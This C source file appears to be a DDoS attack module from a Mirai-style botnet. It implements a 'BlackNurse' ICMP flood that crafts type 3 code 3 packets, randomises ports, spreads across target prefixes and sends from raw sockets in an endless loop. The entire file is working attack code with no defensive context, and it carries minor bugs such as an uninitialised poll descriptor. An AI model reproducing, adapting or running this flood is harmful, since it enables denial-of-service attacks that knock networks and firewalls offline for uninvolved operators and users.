#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <errno.h>
#include <poll.h>

#include "headers/includes.h"
#include "headers/attack.h"
#include "headers/protocol.h"
#include "headers/util.h"
#include "headers/checksum.h"
#include "headers/rand.h"

//BlackNurse ICMP V2.
void attack_icmp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts) {
    uint8_t pkt_template[] = {
        0x03,
        0x03,
        0x0d,
        0x33,
        0x00,
        0x00,
        0x00,
        0x00,
        0x45,
        0x00,
        0x00,
        0x1c,
        0x4a,
        0x04,
        0x00,
        0x00,
        0x40,
        0x06,
        0x20,
        0xc5,
        0x01,
        0x02,
        0x03,
        0x04,
        0x05,
        0x06,
        0x09,
        0x07,
        0x08,
        0x00,
        0x00,
        0x00,
        0x00,
        0x00,
        0x08,
        0xef,
        0xc1
    };
    uint8_t * pkt;
    const char *host;
    struct pollfd pfd;
    const size_t pkt_len = (sizeof pkt_template) / (sizeof pkt_template[0]);
    size_t i;
    int gai_err;
    int kindy;
    int x, secs, get, targ;

    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }
    for(i = 0; i < targs_len; i++)
    {
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);
    
        // For prefix attacks
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
    }

    struct filedec {
        int fd;
    }fds[targs_len];

    for(i = 0; i < targs_len; i++)
    {
        fds[i].fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    }

    pkt = pkt_template;
    pfd.fd = kindy;
    pfd.events = POLLOUT;

    for (i = 20; i < 20 + 8 + 4; i++) {
        pkt[i] = (uint8_t) rand();
    }

    while(1)
    {
        for(targ = 0; targ < targs_len; targ++)
        {
            if (sendto(fds[targ].fd, pkt, pkt_len, 0, (struct sockaddr *)&targs[targ].sock_addr, sizeof(struct sockaddr_in)) != (ssize_t) pkt_len) {
                if (errno == ENOBUFS) 
                {
                    poll(&pfd, 1, 1000);
                    continue;
                }
                break;
            }
        }
    }
} //Testing This STD/PPS Flood
